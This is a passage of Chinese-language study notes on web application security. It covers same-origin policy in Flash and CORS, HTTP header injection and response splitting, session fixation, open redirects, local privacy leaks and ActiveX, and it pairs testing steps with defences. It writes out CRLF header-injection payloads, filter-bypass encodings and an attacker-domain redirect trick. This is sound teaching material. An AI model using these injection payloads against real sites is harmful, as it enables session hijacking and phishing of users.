<li>如果文件中的策略为 allow-access-from domain=“*”，则意味着应用程序允许无限制的访问，任何其他站点都可以和应用程序执行双向交互，控制用户的会话，检索全部的数据，执行任何用户的操作；</li>
<li>如果应用程序允许子域与其进行交互，那么攻击者可以利用子域上可能存在的 XSS 漏洞，来与父域进行交互；如果子域能够付费播放攻击者的 Flash 广告，那么攻击者就可以用其设计过的 Flash 对象来实现交互，读取数据；</li>
<li>策略文件中可能包含内网的主机名等一些对攻击者非常有帮助的信息；</li>
</ul>
<p>目前大多数 Web 程序都没有在 /crossdomain.xml 路径存放策略文件，开发者假设没有该文件意味着自动禁止所有的跨域访问。但实际上，Flash 浏览器的行为并不是这样的，当它在默认的顶级位置找不到策略文件时，如果有指定其他的下载 URL 路径，那么它会到该路径下面去寻找；当该路径的响应确实是一个 XML 格式的文件，并且在 content-type 消息头中也备注了是 XML 类型，那么浏览器就会接受该文件；这意味着，如果应用程序存在某个功能，允许用户上传文件到其域中，那么攻击者就可以先上传自定义的策略文件到应用程序中，然后在 Flash 对象中指定访问该上传路径，读取到其上传的策略文件，得到授权；</p>
<h4 id="同源策略与-Silverlight"><a href="#同源策略与-Silverlight" class="headerlink" title="同源策略与 Silverlight"></a>同源策略与 Silverlight</h4><p>Silverlight 的源认定跟 Flash 是一样的，那由加载对象的 URL 所在的域决定；但 Silverlight 有一点比 Flash 宽松，即它在源认定中不限制协议和端口，这意味着只要是相同域名就可以了，HTTP 还是 HTTPS 无所谓，不同端口号也无所谓；</p>
<p>Silverlight 的跨域策略文件位置为 /clientaccesspolicy.xml，以下示例是微软家的：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317082813.png"></p>
<blockquote>
<p> Flash 的潜在漏洞点，同样也适用于 Silverlight</p>
</blockquote>
<h4 id="同源策略与-Java"><a href="#同源策略与-Java" class="headerlink" title="同源策略与 Java"></a>同源策略与 Java</h4><p>Java 的同源策略有一个特点，即在某些情况下，与来源域共享 IP 地址的其他域，将被视为“同源”；因此，如果有多个应用程序共享主机，会产生跨域交互的可能；</p>
<p>Java 不限制一个域发布自己与其他域进行交互的策略；</p>
<h3 id="同源策略与-HTML5"><a href="#同源策略与-HTML5" class="headerlink" title="同源策略与 HTML5"></a>同源策略与 HTML5</h3><p>XMLHttpRequest 一开始仅允许提出同源的请求，但 H5 引入了新的规则，使其可以和任意域进行交互，只要该域为当前访问提供了权限即可；权限控制通过 HTTP 消息头的多个字段来实现；</p>
<ul>
<li>常规请求（使用现有 HTML 生成的请求，如表单），浏览器将直接发出请求，并检查响应，看是否允许后续的脚本读取该响应的内容；</li>
<li>非常规请求（非 HTML 生成的请求，如 JS ），浏览器先向目标 URL 提出一个 OPTIONS 请求，然后检查消息头，看权限如何设置，然后再决定是否发出该非常规请求（即发请求前，先做一个确认的动作）；</li>
</ul>
<p>不管哪种情况，浏览器在提出请求时，都会在请求的消息头中，将 Origin 字段值设置为提出请求的域，以便目标 URL 的服务器能够依据该值，告知授权情况；服务器会在响应中的 Access-Control-Allow-Origin 字段中，指定其允许访问的来源域；</p>
<p>如果是 OPTIONS 确认请求，目标服务器还会返回更多的字段信息，以便进行更加精细化的权限控制，包括如下几个字段：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317090210.png"></p>
<p>渗透测试步骤：</p>
<ul>
<li>向目标应用程序发起一个包含 Origin 消息头的 XMLHttpRequest 请求，检查其响应，看看其中的 Access-Control 字段的值是如何设置的；</li>
<li>如果支持跨域访问，再发一个 OPTIONS 请求，检查其具体的规则；</li>
</ul>
<p>XMLHttpRequest  的这种跨域新特性引入了新的漏洞；假设攻击者知道目标程序使用 XMLHttpRequest  来发请求，并动态提取响应结果，插入到 HTML 页面中的某个位置；那么攻击者可以先插入一个指向自己控制的服务器的 URL，诱使用户进行点击；然后在自己的服务器上放上相应的恶意文件，等待用户点击后下载，被目标程序提取，插入到页面中；</p>
<h3 id="通过代理服务合并域"><a href="#通过代理服务合并域" class="headerlink" title="通过代理服务合并域"></a>通过代理服务合并域</h3><p>有些 Web 应用程序的功能，实际是在扮演中介的作用；当用户发出某个请求时，它实际上是去其他第三方网站搜索查询，处理后再展示用户，例如很多在线网页翻译程序，它允许用户提交一个网站的 URL，然后它会去抓取该 URL 页面的内容，并将其翻译成指定的语言；</p>
<p>由于翻译程序不会修改源网页的 HTML 标签和 JS ，这时候会出现一个有趣的现象，即对于浏览器来说，页面上的所有内容都隶属于应用程序，但页面内容中实际上包含着来自外部网站的代码；如果用户通过 GT 访问两个域的内容，对于浏览器来说，它们都属于 GT 域；因此，原来来自两个域的代码是不能相互访问的，但是由于现在它们都隶属于 GT 名下，因此，从某种意义上来说，它们变成了同源的，因此，彼此之间可以相互访问；假设其中一个域包含公开、无须登录即可访问的内容，那么攻击者就可以利用这种间接机制，实现跨域的访问；</p>
<h2 id="其他客户端注入攻击"><a href="#其他客户端注入攻击" class="headerlink" title="其他客户端注入攻击"></a>其他客户端注入攻击</h2><h3 id="HTTP-消息头注入"><a href="#HTTP-消息头注入" class="headerlink" title="HTTP 消息头注入"></a>HTTP 消息头注入</h3><p>如果应用程序某个功能使用用户的输入，做为某个消息头字段值的话，那么就可能存在消息头注入漏洞（尤其是当攻击者能够注入换行符时，就可以随心所意插入任意消息头了）；</p>
<p>常见的两个注入位置出现在 Location 和 Set-Cookie 字段，前者提取用户输入进行重定向，后者提取用户输入做为偏好存储（例如存储用户的界面语言选项）；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /settings/12/Default.aspx?Language=Enghtlish HTTP/1.1</span><br><span class="line">Host: app.com</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: PreferedLanguag=English</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="利用消息头注入漏洞"><a href="#利用消息头注入漏洞" class="headerlink" title="利用消息头注入漏洞"></a>利用消息头注入漏洞</h4><p>探查消息头注入漏洞的方法，跟探查 XSS 漏洞的方法类似，就是查找用户输入是否会出现在响应的消息头中；</p>
<p>渗透测试步骤：</p>
<ul>
<li>如果用户输入会被提取到响应的消息头中，那么确认应用程序是否接受 URL 编码的回车符（%0d）或者换行符（%0a），以及它们是否会原样在响应中返回；</li>
<li>在确认换行是否在响应中注入成功时，应注意此时换行符不再以 URL 编码的形式出现了，而是被解码后的样子，即报文相应的位置正常应该出现换行；</li>
<li>如果响应中仅返回两个换行符的一个，仍然可以设计出有效的注入方法；</li>
<li>如果换行符被服务端净化了，那么还有如下几种方法可以进行尝试：<ul>
<li>foo%00%0d%0abar：添加一个 null 字节；</li>
<li>foo%250d%250abar：对百分号进行编码；</li>
<li>foo%%0d0d%%0a0abar：后端有可能没有使用递归；</li>
</ul>
</li>
</ul>
<blockquote>
<p>在查看注入是否成功时，除了 HTML 源代码和浏览器插件后，还应使用专门的拦截工具，对响应消息头进行分析，确保注入成功，避免忽略了实际已经成功的可能；</p>
</blockquote>
<h5 id="注入-cookie"><a href="#注入-cookie" class="headerlink" title="注入 cookie"></a>注入 cookie</h5><p>假设目标程序存在 cookie 注入漏洞，则攻击者可以设计一个 URL，在参数中包含要注入的 cookie 值；当用户点击该 URL 后，目标程序会根据收到的请求，返回相应的 cookie 给用户的浏览器，从而实际注入的目的；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 专门设计的  URL</span><br><span class="line">GET /setting/12/default.aspx?Language=English%0d%0aSet-Cookie:+SessId%3d120a12f98e8; HTTP/1.1</span><br><span class="line">Host: app.net</span><br><span class="line"></span><br><span class="line">// 目标程序的响应</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: PreferedLanguage=English</span><br><span class="line">Set-Cookie: SessId=120a12f98e8;  // 此条为额外注入的 cookie</span><br></pre></td></tr></table></figure>

<h5 id="传送其他攻击"><a href="#传送其他攻击" class="headerlink" title="传送其他攻击"></a>传送其他攻击</h5><p>当存在消息头注入漏洞，导致可以注入任意内容时，那么这个漏洞可以用来传送很多其他攻击；</p>
<h5 id="HTTP-响应分割"><a href="#HTTP-响应分割" class="headerlink" title="HTTP 响应分割"></a>HTTP 响应分割</h5><p>当攻击者可以利用消息头漏洞，插入任意的内容时，那么有一种利用该漏洞的攻击方法称为 HTTP 响应分割，攻击者利用它创建一个木马页面，注入代理服务器的缓存中，等待管理员访问该页面，从而获得管理员的密码；过程如下：</p>
<ul>
<li>攻击者利用注入漏洞，将木马页面做为第一个请求的消息头参数，并同时发第二个请求；</li>
<li>代理服务器收到两个请求，转发给应用程序；</li>
<li>应用程序收到两个请求后，生成两个响应；</li>
<li>代理服务器先收到第一个响应，由于注入的存在，该响应被代理服务器解析为两个响应；</li>
<li>其中第二个响应指向管理员登录页面，被代理服务器缓存（通过设置 If-Modified-Since 和 Last-Modified 两个字段，攻击者可以覆盖代理服务器上已存在的管理员登录页面）；</li>
<li>代理服务器收到应用程序的第二个响应，但由于前一个响应已经被解析为两个响应，当前收到的响应，对于代理服务器来说，相当于第三个响应，由于代理服务器判断之前的请求都已经获得响应，因此它会丢弃当前收到的响应；</li>
<li>管理员请求管理页面；</li>
<li>代理服务器发现缓存命中，在响应中直接返回缓存中的木马页面给管理员；</li>
<li>管理员输入密码，发送登录请求；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318090959.png"></p>
<p>请求示例：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091231.png"></p>
<blockquote>
<p>同时发送两个请求，在 HTTP 协议中，这样做是合法的</p>
</blockquote>
<p>响应结果：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091127.png"></p>
<blockquote>
<p>攻击者发送了两个请求，代理服务器也转发了两个请求，但由于响应分割，应用程序的第一个响应会被代理服务器解析为两个响应；之后应用程序的真正第二个响应会被代理服务器丢弃；</p>
</blockquote>
<h4 id="防止消息头注入漏洞"><a href="#防止消息头注入漏洞" class="headerlink" title="防止消息头注入漏洞"></a>防止消息头注入漏洞</h4><p>防止的最好方法是不提取用户输入做为消息头的数据，如果实在要用，则需要采取以下措施：</p>
<ul>
<li>输入确认：仅包含字母，最大长度为6字节；</li>
<li>输出确认：任何 ASCII 码小 0x20 的字符都应视为可疑字符，应拒绝包含该字符的请求；</li>
</ul>
<h3 id="cookie-注入"><a href="#cookie-注入" class="headerlink" title="cookie 注入"></a>cookie 注入</h3><p>常见的 cookie 注入方式：</p>
<ul>
<li>某些应用程序从请求参数中提取键值对，作为 cookie 值；</li>
<li>某些应用程序存在 HTTP 消息头注入漏洞，可利用该漏洞注入任意的 Set-Cookie 消息头；</li>
<li>某个目标域存在 XSS 漏洞，利用该漏洞设置一个  cookie，然后在该目标域父域或子域中使用；</li>
<li>利用主动中间人攻击（例如使用公共无线网络的用户）；</li>
</ul>
<p>攻击者利用 cookie 达成攻击的方式：</p>
<ul>
<li>某个特殊的 cookie 值可能会破坏应用程序的逻辑；</li>
<li>客户端代码通常直接信任并读取使用 cookie 值，很少加予过滤和净化，因此可以通过 cookie 来实现注入；</li>
<li>某些应用程序在 cookie 上放令牌，实现 CSRF 防御，攻击者可通过修改 cookie 来破坏这种防御；</li>
<li>攻击者通过 cookie 让用户登录自己的账号，下载其提前上传的攻击荷载；</li>
<li>设置任意 cookie，可利用会话固定漏洞；</li>
</ul>
<h4 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h4><p>某些应用程序在用户首次访问后，即为用户分配了一个匿名会话，等用户登录后，该会话保持不变，但权限升级；这里面存在一个漏洞，攻击者可以先访问应用程序，获得一个有效但无权限的会话，然后通过 cookie 注入漏洞，将该会话发给用户使用；一旦用户完成登录，攻击者拥有的这个会话的权限便直接升级了，从而实现了会话劫持；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319083904.png"></p>
<p>只要会话跟用户信息相关，那么即使应用程序没有登录功能，攻击者也能够用会话固定漏洞来窃取用户信息；攻击者只需要先注入 cookie，然后等待用户在某个环节填写个人信息，保存在会话中以后，再用自己掌握的这个会话令牌，向应用程序发起请求，获得用户的个人信息；</p>
<p>有些应用程序很搞笑，它会直接接受用户提交的任意令牌，当检查发现该令牌不在自己的列表中时，会直接使用该令牌为用户创建一个新的会话；攻击者只需要制作一个令牌，然后通过网络任意的分发（如电子邮件），只要有用户点击，使用令牌发出请求，攻击者就可以实施劫持；</p>
<h4 id="查找并利用会话固定漏洞"><a href="#查找并利用会话固定漏洞" class="headerlink" title="查找并利用会话固定漏洞"></a>查找并利用会话固定漏洞</h4><p>存在固定会话漏洞的应用程序的常见特征：</p>
<ul>
<li>应用程序向每个未验证的用户发布一个匿名令牌，并且在用户登录后，不发布新令牌，而是升级旧令牌（多数应用程序服务器的默认配置即是如此）；</li>
<li>应用程序不向未验证的用户发布匿名令牌，仅在用户登录后发布令牌；但是如果用户使用已有令牌和另外一名用户的密码登录，程序没有发布新令牌，而是使用旧令牌来存储新用户的会话；</li>
</ul>
<blockquote>
<p>以上两种情况，攻击者都可以通过注入自己获得的令牌，来劫持用户的会话；</p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>通过任何可行的办法，获得一个有效的令牌；</li>
<li>访问登录页面，使用该令牌进行登录；</li>
<li>如果登录成功，且应用程序没有发布新令牌，则表示存在固定会话漏洞；</li>
</ul>
<p>如果应用程序没有登录功能，但在某个阶段使用会话来保存用户的敏感信息，那么注意检查用户提交敏感信息的前后，其获得和使用的令牌是否发生了变化；</p>
<p>渗透测试步骤：</p>
<ul>
<li>以完全匿名的用户身份获得一个会话令牌，然后完成提交敏感数据的步骤；</li>
<li>继续浏览，直到任何显示敏感数据的页面；</li>
<li>如果最初获得的令牌，现在可以用来访问显示敏感数据的页面，则表示应用程序存在漏洞；</li>
<li>如果发现漏洞，进一步检查应用程序是否接受并非它发布的令牌；如果接受，则意味着攻击者可以非常容易利用该漏洞；</li>
</ul>
<h4 id="防止会话固定漏洞"><a href="#防止会话固定漏洞" class="headerlink" title="防止会话固定漏洞"></a>防止会话固定漏洞</h4><p>任何时候，只要用户通过验证，应用程序就应该为用户发布一个新令牌；有些特别注重安全的应用程序，甚至使用单页面令牌，来提供深层的防御；</p>
<h3 id="开放式重定向漏洞"><a href="#开放式重定向漏洞" class="headerlink" title="开放式重定向漏洞"></a>开放式重定向漏洞</h3><p>如果应用程序提取用户的输入，作为重定向的数据，那么应用程序可能存在开放式的重定向漏洞；攻击者可以使用该漏洞进行钓鱼攻击，引导用户到攻击者控制的目标页面；由于这个页面是通过重定向到达的，普通用户往往不会对其产生怀疑；</p>
<h4 id="查找并利用漏洞"><a href="#查找并利用漏洞" class="headerlink" title="查找并利用漏洞"></a>查找并利用漏洞</h4><p>检查应用程序所有的重定向响应，一般有以下几种常见的做法：</p>
<p>使用 3XX 状态码和 Location 字段；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091713.png"></p>
<p>使用 Refresh 消息头，并设置时间间隔为 0，这样就可以立即触发，实现类似重定向的效果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091725.png"></p>
<p>使用 HTML 中的 meta 标签，来复制消息头的行为，从而实现重定向的效果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091738.png"></p>
<blockquote>
<p>问：meta 标签的用途？</p>
<p>答：HTML 有一些用来表示页面元信息的标签，例如 base, link, script, style, title 等；如果有些元信息无法使用已有的元标签进行表示，则使用 meta 来表示，相当于“其他”；</p>
</blockquote>
<p>使用 Javascript 的 API 来实现重定向</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091819.png"></p>
<p>渗透测试步骤</p>
<ul>
<li>使用拦截器检查应用程序中所有使用了重定向的位置；</li>
<li>分析每个重定向使用了什么样的方法；</li>
</ul>
<p>绝大多数的重定向是不受用户控制的，有一个常见的场景是用户浏览到某个页面时，应用程序要求用户进行登录，此时应用程序会重定向的登录页面；然后在用户登录后，应用程序会重定向跳回之前中止浏览的页面（开发者经常将目标页面的URL 放在请求参数中）；</p>
<p>渗透测试步骤：</p>
<ul>
<li>如果用户提交的数据，在重定向的绝对 URL 中出现，则尝试修改 URL 中的域名，看应用程序是否会对新域名发起访问，重定向到新域名；</li>
<li>如果用户提交的数据，在重定向的相对 URL 中出现，也将其改为另外一域名，然后观察应用程序的反应；</li>
</ul>
<p>如果响应出现以下行为，则说明漏洞存在：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319092517.png"></p>
<blockquote>
<p>有些应用程序允许用户指定 URL，然后应用程序会加载该 URL 指向的内容，到当前页面的 iframe 中；虽然它不是严格意义上的重定向漏洞，但是二者很类似，攻击者可以同样加予利用；</p>
</blockquote>
<p>为了阻止重定向攻击，开发者会对用户的输入进行净化和过滤，一般有如下两种常见的机制：</p>
<h5 id="阻止绝对-URL"><a href="#阻止绝对-URL" class="headerlink" title="阻止绝对 URL"></a>阻止绝对 URL</h5><p>应用程序检查用户的输入是否以 http 开头，此时可尝试通过对 http 进行混淆，看是否能够避开过滤</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082444.png"></p>
<p>应用程序检查并删除 http 字样，此时可尝试添加多个 http；若应用程序没有递归净化，则可能避开</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082620.png"></p>
<p>应用程序检查 URL 是否包含自己的域名，则攻击者可以在其控制的域名中添加应用程序域名作为子域名或路径</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082841.png"></p>
<h5 id="附加绝对前缀"><a href="#附加绝对前缀" class="headerlink" title="附加绝对前缀"></a>附加绝对前缀</h5><p>应用程序开发者可能会在用户的输入前面，添加一个指向自己域名的前缀，来避免重定向漏洞；这种方法不错，但是有个前提，即开发者添加的前缀一定要有斜杠作为结束，不然攻击者仍然有机会操控该 URL 的结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--假设开发者添加的固定前缀为 http://app.net，则攻击者将输入设计为 .attacker.net，则最终结果变成了如下--&gt;</span></span><br><span class="line">http://app.net.attacker.net</span><br></pre></td></tr></table></figure>

<p>有些重定向的动作并不是由服务端的响应来发起的，而是由前端的 js 代码直接提取用户输入来生成的，此时应仔细检查前端 js 代码的逻辑，看其是否存在漏洞；常见的 js 重定向 API 如下：</p>
<ul>
<li>document.location</li>
<li>document.URL</li>
<li>document.open()</li>
<li>window.location.href</li>
<li>window.navigate()</li>
<li>window.open()</li>
</ul>
<h4 id="防止开放式重定向漏洞"><a href="#防止开放式重定向漏洞" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>避免提取用户的输入生成重定向目标，是防御重定向漏洞的根本办法；有些开发者使用一个通用的重定向页面 + 目标 URL 参数来实现重定向，比较好的替代办法如下：</p>
<ul>
<li>使用直接指向目标页面的 URL，避免使用重定向页面进行跳转；</li>
<li>使用列表，参数只传索引即可，而不是传送目标 URL；</li>
</ul>
<p>如果一定要将用户的输入合并到 URL 中的话，应该采取如下措施：</p>
<ul>
<li>使用相对 URL 作为输入；严格检查，不要尝试进行净化；确保输入以斜杠+字母开头，或者直接以字母开头，其他情况通通拒绝；</li>
<li>如果用户提交的 URL 不必斜线开头，则添加前缀时务必添加斜线；</li>
</ul>
<p>避免使用前端 JS 代码来实现重定向，因为这部分代码不可控制，而且其逻辑完全暴露在了攻击者面前；</p>
<h3 id="客户端-SQL-注入"><a href="#客户端-SQL-注入" class="headerlink" title="客户端 SQL 注入"></a>客户端 SQL 注入</h3><blockquote>
<p>HTML5 支持客户端使用 SQL 数据库，应用程序可以客户端存储数据，并使用 js 进行访问；此特性有助于客户端的功能实现离线工作；</p>
</blockquote>
<p>当使用 SQL 数据库时，不管是客户端还是服务端，都可能存在 SQL 注入的漏洞，常见的易受攻击的应用程序：</p>
<ul>
<li>社交网络程序：将用户的联系人存储在本地数据库中；</li>
<li>新闻应用程序：将文章和用户评论存储在本地数据库中，以便离线查看；</li>
<li>Web 邮件程序：将电子存储在本地，以便离线状态下能够正常工作，并将写好的邮件在上线后进行发送；</li>
</ul>
<p>如果攻击者实现了 SQL 注入，就可以查询用户本地数据库中的数据，并进行提取发送给攻击者；</p>
<h3 id="客户端-HTTP-参数污染"><a href="#客户端-HTTP-参数污染" class="headerlink" title="客户端 HTTP 参数污染"></a>客户端 HTTP 参数污染</h3><p>攻击者通过针对性的设计 HTTP 请求参数，可以利用服务端应用程序的逻辑，同样，这种做法也可以用于破坏前端的逻辑；漏洞的前提是服务器会提取攻击者的输入，并将其用于生成 URL 的参数，此时攻击者就有机会向 URL 中注入一些额外的参数，破坏该 URL 原本的逻辑；</p>
<h2 id="本地隐私攻击"><a href="#本地隐私攻击" class="headerlink" title="本地隐私攻击"></a>本地隐私攻击</h2><p>在某些场景下，例如网吧，同一台计算机会被很多用户共用使用，并且他们很可能会访问同一个应用程序，因此，攻击者此时有机会访问受害者使用的同一台计算机；</p>
<blockquote>
<p>应用程序会在本地存储一些用户的敏感信息，为了检测存储了哪些信息，最好的办法是使用虚拟机，因为虚拟机里面是一个干净的操作系统和浏览器，很容易找到目标数据；</p>
<p>另外，有时候应用程序存储的数据可能会设置为隐藏模式，因此，需要在文件系统的选项中，将所有隐藏文件显示出来，以方便查找；</p>
</blockquote>
<h3 id="持久性-cookie"><a href="#持久性-cookie" class="headerlink" title="持久性 cookie"></a>持久性 cookie</h3><p>多数浏览器支持持久性 cookie 的功能，并将这些 cookie 值保存在本地文件系统中；一些应用程序会使用该功能保存敏感数据；</p>
<p>渗透测试步骤</p>
<ul>
<li>在解析应用程序的环节中，特别注意带有 set-cookie 指令的响应，如果其中包含 expire 属性，则该 cookie 值将被保存，直到过期；</li>
<li>如果某个持久性的 cookie 中包含敏感数据，由于攻击者能够使用同一台电脑，因此攻击者能够马上获取该 cookie 中的数据。例如直接使用 cookie 中的令牌，无须破译其中的内容，以受害者的身份访问应用程序；</li>
</ul>
<h3 id="缓存-Web-内容"><a href="#缓存-Web-内容" class="headerlink" title="缓存 Web 内容"></a>缓存 Web 内容</h3><p>大多数浏览器默认会将非 SSL 页面的内容保存在缓存中，并存储在本地文件系统中，除非应用程序有在响应中明确要求不要保存；</p>
<p>渗透测试步骤</p>
<ul>
<li>检查服务器的 HTTP 响应内容，查看其中的缓存指令；</li>
<li>禁止缓存的相关指令包括：<ul>
<li>Expires: 0</li>
<li>Cache-Control: no-cache</li>
<li>Pragma： no-cache</li>
</ul>
</li>
<li>如果响应中没有这些指令，那么内容正常都会被浏览器缓存；</li>
<li>使用虚拟机中操作系统默认安装的干净的浏览器，清除所有缓存和cookie，然后访问包含敏感数据的应用程序页面；</li>
<li>检查新增的缓存文件，看其中是否包含敏感数据；</li>
<li>如果新增的缓存文件很多，则提取一个页面字符串，在缓存中进行搜索定位；</li>
<li>不同的浏览器默认的缓存目录不同，应根据情况在不同的位置进行查找；</li>
</ul>
<h3 id="浏览历史记录"><a href="#浏览历史记录" class="headerlink" title="浏览历史记录"></a>浏览历史记录</h3><p>多数浏览器都会保存用户的浏览记录，而某些浏览记录对应的请求，可能使用 GET，因此该请求的参数中，很可能包含有敏感数据；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序时，注意通过 URL 参数传送敏感数据的所有情况；</li>
<li>如果存在以上情形，查看浏览器的浏览记录，看这些敏感数据是否出现在其中；</li>
</ul>
<h3 id="自动完成"><a href="#自动完成" class="headerlink" title="自动完成"></a>自动完成</h3><p>很多浏览器提供自动完成的功能，该功能会保存用户名、卡号、密码等敏感数据，并将数据存储在本地文件系统中；这些数据可被攻击者访问的同时，还有可能被 XSS 攻击获取（伪表单，诱使用户触发自动完成功能）；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序中，确定包含表单的源代码位置</li>
<li>如果表单的标签未设置 autocomplete=off，则用户输入的数据将被浏览器默认保存在本地（如果浏览器选项已经设置开启自动完成功能的话）；</li>
</ul>
<h3 id="Flash-本地共享对象"><a href="#Flash-本地共享对象" class="headerlink" title="Flash 本地共享对象"></a>Flash 本地共享对象</h3><p>Flash 有自己的存储机制，更有意思的是，它可以跨浏览器共享数据，只要它们都安装了相同的 Flask 插件即可；</p>
<p>渗透测试步骤</p>
<ul>
<li>有些现成的插件（如 BetterPrivacy）可浏览由用户应用程序创建的 Flash 本地共享对象；</li>
<li>不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始 Flash 存储内容；</li>
</ul>
<h3 id="Silverlight-独立存储"><a href="#Silverlight-独立存储" class="headerlink" title="Silverlight 独立存储"></a>Silverlight 独立存储</h3><p>Silverlight 跟 Flash 一样，也有使用自己的独立存储</p>
<p>渗透测试步骤</p>
<ul>
<li>不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始存储内容</li>
</ul>
<h3 id="IE-userData"><a href="#IE-userData" class="headerlink" title="IE userData"></a>IE userData</h3><p>IE 也有自己的本地存储机制，称为 userData，同样可以直接查看其中的原始存储内容，一般在以下路径</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210324083708.png"></p>
<h3 id="HTML5-本地存储"><a href="#HTML5-本地存储" class="headerlink" title="HTML5 本地存储"></a>HTML5 本地存储</h3><p>H5 引入了一些新的存储机制，包括</p>
<ul>
<li>会话存储</li>
<li>本地存储</li>
<li>数据库存储</li>
</ul>
<p>由于 H5 的规范还在完善中，因此其存储位置可能会动态变化，应根据浏览器支持的 H5 版本而定；</p>
<h3 id="防止本地隐私攻击"><a href="#防止本地隐私攻击" class="headerlink" title="防止本地隐私攻击"></a>防止本地隐私攻击</h3><ul>
<li>应避免将敏感数据存储在持久性 cookie 中</li>
<li>应用程序应使用合适的禁止缓存指令，避免浏览器敏感数据保存在本地；</li>
<li>杜绝使用 URL 参数传递敏感数据，而应使用 POST 方法；</li>
<li>在用户输入敏感数据的表单位置，应添加 autocomplete=off 属性，以避免自动完成功能记录用户输入的敏感数据；</li>
<li>如果需要在本地存储敏感数据，应该对这些数据进行加密，以防止攻击者直接访问；</li>
<li>告知用户存储风险，以便需要时，用户可以禁用该功能；</li>
</ul>
<h2 id="攻击-ActiveX-控件"><a href="#攻击-ActiveX-控件" class="headerlink" title="攻击 ActiveX 控件"></a>攻击 ActiveX 控件</h2><blockquote>
<p> ActiveX 是一个很有意思的技术理念，由于很多软件背后存在一些通用的功能，因此如果每个软件如果都需要就这些通用功能进行编写的话，显然是一种重复的工作，尤其是跨语言的情况（相同语言内部，可以使用导入第三方模块来解决）；为了让不同语言编写的功能，能够实现复用，微软发明了 ActiveX 技术，它本质上是一种接口规范，各应用程序将可供外部调用的功能，按该规范进行编写，则 Windows 操作系统上的其他程序，就可以对其进行调用，而无须打开源应用程序；</p>
<p> ActiveX 控件是专指 Active 理论在 IE 浏览器上的应用，IE 浏览器通过 ActiveX 控件，可以实现对本地其他应用程序功能的调用，例如本地视频播放器、Flash 播放器、Office 软件等，这样可以大大加强 IE 本身可以提供的功能，让 IE 可以直接处理原本它处理不了的文件，给用户提供更好的浏览体验；</p>
<p> 不同的应用程序在 IE 中有不同的 ActiveX 控件，用户可以根据需要进行安装；当安装了某个 ActiveX 控件后，该控件就会在浏览器中运行，当用户需要打开或播放某个该控件支持的文件时，该控件就会向操作系统调用本地应用程序，处理该文件，并将结果返回给 IE 浏览器；ActiveX 控件相当于充当了 IE 浏览器和本地应用程序之间的桥梁；</p>
<p> 开发者在 HTML 源代码中，指定某个 ActiveX 控件的调用，并传递相应的参数；IE 浏览器在解析 HTML 时，将根据控件 ID，调用该控件，并传递相应的参数，之后的工作将由 ActiveX 控件接手处理；</p>
<p> ActiveX 控件的优点在于其提供了强大的灵活性，因此能够带来很好的协同效果，但这是一把双刃剑，其功能越强大，意味着攻击者越有机会利用它来实现攻击目标，而绝大多数用户是缺少安全意识的，因此完全无法保护好自己；更糟糕的是， ActiveX 没有像 Java Applet 控件一样使用沙箱技术，一旦用户安装了某个 ActiveX 控件，该控件将成为了操作系统的一部分，具备很大的权限；</p>
<p> ActiveX 控件技术仅在 IE 浏览器中被支持，其他家的浏览器都不支持，安全起见，普通用户最好禁用该功能；</p>
</blockquote>
<h3 id="查找-ActiveX-漏洞"><a href="#查找-ActiveX-漏洞" class="headerlink" title="查找 ActiveX 漏洞"></a>查找 ActiveX 漏洞</h3><p>如果一个网站使用了 ActiveX 控件，则在其网页的源代码中，将出现调用或下载安装该控件的相关代码，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325074852.png"></p>
<blockquote>
<p>classid 参数用来标识控件的全局 id；codebase 参数用来标识控件下载地址；</p>
</blockquote>
<p>在首次安装的时候，浏览器会弹出警告，要求用户确认控件的可信性；一旦用户点击确认后，该控件即被安装并标记为“脚本执行安全”；由于控件是全局的，这意味着，随后其它网站也可以调用该控件，调用方式如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075157.png"></p>
<p>渗透测试步骤：</p>
